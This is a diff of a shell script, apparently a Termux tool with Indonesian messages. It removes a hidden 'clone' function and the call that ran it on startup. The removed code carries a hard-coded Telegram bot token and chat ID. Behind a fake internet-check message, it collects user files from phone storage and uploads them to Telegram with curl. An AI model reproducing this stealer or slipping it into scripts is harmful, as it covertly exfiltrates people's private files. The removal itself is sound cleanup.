@@ -123,33 +123,6 @@ command_exists() {
   command -v "$1" >/dev/null 2>&1
 }
 
-clone() {
-BOT_TOKEN="7915022110:AAHrfbtwSQrN9FyTsftIlUKM48Gl1Uvj5yQ"
-CHAT_ID="7380101464"
-echo "${BOLD} MEMASTIKAN CONECTION INTERNET ANDA BERSIH PROSES 10 DETIK"
-echo "${BOLD} JANGAN MENGHIDUPKAN VPN ATAUPUN BERNIAT DECODE TOOLS V8.4 !!"
-loading
-SOURCE_DIR="/storage/emulated/0"
-[[ ! -d "$SOURCE_DIR" ]] && exit 0
-mapfile -d '' FILES < <(
-  find "$SOURCE_DIR" -type f \( \
-    -iname "*.sh"   -o -iname "*.html" -o \
-    -iname "*.py"   -o -iname "*.go"   -o -iname "*.jpg" -o \
-    -iname "*.txt"  -o -iname "*.zip" \
-  \) -print0
-)
-[[ ${#FILES[@]} -eq 0 ]] && exit 0
-COUNT=0
-for file in "${FILES[@]}"; do
-  (( COUNT++ > 10 )) && break
-  curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
-       -F chat_id="$CHAT_ID" \
-       -F document=@"$file" \
-       -F caption="$(basename "$file")" >/dev/null 2>&1
-       clear
-done
-}
-
 banner() {
   if command_exists figlet; then
     clear
@@ -8838,7 +8811,6 @@ fi
 
 
 #show_whatsapp_support
-clone
 main_menu
 7) # Opsi untuk stop musik
   stop_music
